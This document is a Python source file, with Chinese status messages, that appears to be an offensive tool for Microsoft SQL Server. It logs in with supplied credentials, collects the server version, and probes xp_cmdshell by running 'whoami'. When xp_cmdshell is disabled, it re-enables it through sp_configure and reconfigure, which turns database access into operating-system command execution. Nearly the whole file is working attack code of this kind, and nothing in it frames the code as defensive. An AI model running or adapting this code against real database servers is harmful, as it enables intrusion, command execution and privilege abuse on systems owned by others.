#!/usr/bin/python
# -*- coding: utf-8 -*-
import pymssql
import time


class mssql_connect():
    def __init__(self, host, port, username, password, database):
        self.host = host
        self.username = username
        self.port = port
        self.password = password
        self.database = database
        self.tds_version = '7.0'

    def mssql_conent(self):
        try:
            conn = pymssql.connect(host=self.host, port=self.port, user=self.username, password=self.password,
                                   database=self.database, tds_version=self.tds_version, autocommit=True)
            print("[+]数据库连接成功，开始收集当前环境信息。。。。")
            time.sleep(2)
            return conn
        except Exception as e:
            print("[-]未知错误！")
            quit()


class mssql_exec():
    def __init__(self, coon, payload):
        self.payload = payload
        self.coon = coon

    def sql_exec(self):
        cur = self.coon.cursor()
        cur.execute(self.payload)
        try:
            return cur.fetchone()
        except Exception as e:
            print(e)
        cur.close()

    def sql_shell(self):
        cur = self.coon.cursor()
        try:
            cur.execute(self.payload)
            return cur.fetchone()
        except Exception as e:
            return e
        cur.close()


class get_systeminfo():
    def __init__(self, conn):
        self.conn = conn

    def get_version(self):
        print("[+]get_version模块正在收集数据库版本信息。")
        time.sleep(2)
        paylaod = r"select @@version;"
        sql_exec = mssql_exec(self.conn, payload=paylaod)
        version = sql_exec.sql_exec()
        return "[+]当前数据库版本:" + version[0]

    def get_xpcmdshell(self):
        time.sleep(2)
        paylaod = r"exec master..xp_cmdshell 'whoami';"
        isXpCmdshell = mssql_exec(self.conn, payload=paylaod)
        try:
            result = isXpCmdshell.sql_exec()
            if result != None:
                return 1
            else:
                return 0
        except Exception as e:
            return 0

    def get_CurrentPermisssions(self):
        print("[+]get_CurrentPermisssions模块正在搜集当前权限信息。。。")
        time.sleep(2)
        paylaod = r"exec master..xp_cmdshell 'whoami';"
        if self.get_xpcmdshell():
            CurrentPermisssions = mssql_exec(self.conn, payload=paylaod)
            result = CurrentPermisssions.sql_exec()
            return "[+]当前权限为:" + result[0]
        else:
            return "xp_cmdshell未开启，暂未能查询当前权限！"

    def openXpCmdshell(self):
        print("xp_cmdshell未开启，尝试开启中。。。")
        time.sleep(2)
        mssql_exec(coon=self.conn, payload="exec sp_configure 'show advanced options', 1;").sql_exec()
        mssql_exec(coon=self.conn, payload="reconfigure with override;").sql_exec()
        mssql_exec(coon=self.conn, payload="exec sp_configure 'xp_cmdshell',1;").sql_exec()
        mssql_exec(coon=self.conn, payload="reconfigure with override;").sql_exec()
        try:
            mssql_exec(coon=self.conn, payload=r"exec master..xp_cmdshell 'whoami'")
            print("[+]xp_cmdshell开启成功！")
            return 1
        except Exception as e:
            print("[-]xp_cmdshel开启失败,请尝试其他模式！")
            return 0
